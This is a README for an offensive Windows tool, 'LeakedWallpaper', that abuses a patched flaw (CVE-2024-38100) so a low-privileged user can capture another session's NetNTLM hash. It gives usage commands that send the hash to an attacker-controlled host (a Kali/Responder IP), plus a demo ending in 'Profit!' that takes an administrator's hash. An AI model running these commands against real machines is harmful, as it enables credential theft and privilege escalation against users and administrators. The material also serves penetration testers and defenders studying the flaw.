# Leaked Wallpaper
This is a privilege escalation tool (fixed with CVE-2024-38100 in KB5040434) that allows us to leak a user's NetNTLM hash from any session on the computer, even if we are working from a low-privileged user.

# Usage

```shell
.\LeakedWallpaper.exe <session> \\<KALI IP>\c$\1.jpg [-downgrade]

# Example
  .\LeakedWallpaper.exe 1 \\172.16.0.5\c$\1.jpg -downgrade
```

# Demo
## Video
https://youtu.be/InyrqNeaZfQ

If blocked, see [demo.mkv](https://github.com/MzHmO/LeakedWallpaper/blob/main/demo.mkv)

## Photos
Imagine we have two sessions on the host:
- administrator is a privileged account, its NetNTLM hash is what we want to get
- exploit is a low-privileged account, we are working from it.

Current session id: 2
Target session id: 1
![изображение](https://github.com/user-attachments/assets/c1185c7c-5b9b-490d-ba51-10e54fc0e819)

Responder IP: 172.16.0.5
Windows IP: 172.16.0.2
![изображение](https://github.com/user-attachments/assets/46ab4c8b-0563-4f53-ac2c-8f4bb9849200)

Let's get administrator NetNTLM-hash with the tool!
```shell
.\LeakedWallpaper 1 \\172.16.0.5\c$\1.jpg
```

Profit!
![изображение](https://github.com/user-attachments/assets/2aff56df-189f-44cd-85ce-ef3c4437710c)
